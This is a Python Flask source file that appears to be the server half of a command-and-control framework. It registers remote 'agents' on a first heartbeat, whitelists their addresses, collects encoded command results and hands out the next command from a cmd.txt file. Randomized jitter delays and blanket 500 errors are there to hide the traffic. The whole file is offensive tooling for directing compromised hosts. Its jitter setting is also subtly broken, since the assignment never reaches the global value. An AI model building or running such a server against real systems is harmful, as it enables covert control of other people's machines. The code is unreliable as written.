from flask import Flask, request, render_template_string, abort
from os import path
from server.lib import encode, decode
from time import sleep
from random import randint

max_jitter = 15

app = Flask(__name__)

authorized_ips = []
active_agents = {}

def log_info(host:str, agt:str, message:str):
    print(f"[HOST: {host}] [AGENT: {agt}]: {message}")

def jitter_sleep():
    sleep_time = randint(1, max_jitter)
    print(f" - Jitter Sleep {sleep_time} seconds...")
    sleep(sleep_time)

@app.route('/', methods=['GET', 'POST'])
def index():
    abort(500)

@app.route('/<id>', methods=['GET', 'POST'])
def cmd(id:str):
    host = request.remote_addr
    try:
        if request.method == 'POST':
            agt = active_agents.get(host)
            if not agt:
                agt = "Unknown"

            log_info(host=host, agt=agt, message=f"Decoding CMD ID: {id}")

            cmd_id = decode(data=id)
            log_info(host=host, agt=agt, message=f"Decoded retrieved CMD ID: {id}={cmd_id}")

            if "agt" in cmd_id: # First heartbeat
                agt = cmd_id.split(":")[1]
                active_agents[host] = agt
                authorized_ips.append(host)
                log_info(host=host, agt=agt, message=f"New active agent!")
                log_info(host=host, agt=agt, message=f"Host '{host}' has been whitelisted")
                jitter_sleep()
                return encode("ACK")
            
            if host not in authorized_ips:
                log_info(host=host, agt=agt, message=f"Host '{host}' not authorized")
                abort(500)

            # Only for legit agents
            ## Check if the message is CMD result response            
            if "rslt" in cmd_id: # CMD result
                rsp = cmd_id.split(":")[1]
                log_info(host=host, agt=agt, message=f"CMD result: {rsp}")
                return encode("ACK")

            ## Beacon next CMD
            current_dir = path.dirname(path.abspath(__file__))
            with open(path.join(current_dir, "cmd.txt"), 'r') as file:
                lines = file.readlines()
            
            cmd_id = int(cmd_id)
            if cmd_id >= len(lines):
                log_info(host=host, agt=agt, message=f"CMD ID Sleep because no ID")
                jitter_sleep()
                return encode("n-id")

            return_lines = lines[cmd_id]
            return_text = ''.join(return_lines)
            
            log_info(host=host, agt=agt, message=f"CMD sent: {return_text}")
            jitter_sleep()
            return encode(return_text)
        else:
            log_info(host=host, agt="No Agent", message=f"Request method not allowed")
            abort(500)
    except Exception as error:
        print(error)
        abort(500)

def launch_server(host="127.0.0.1", port=8080, debug=False, jitter=15):
    max_jitter = jitter
    app.run(debug=debug, host=host, port=port)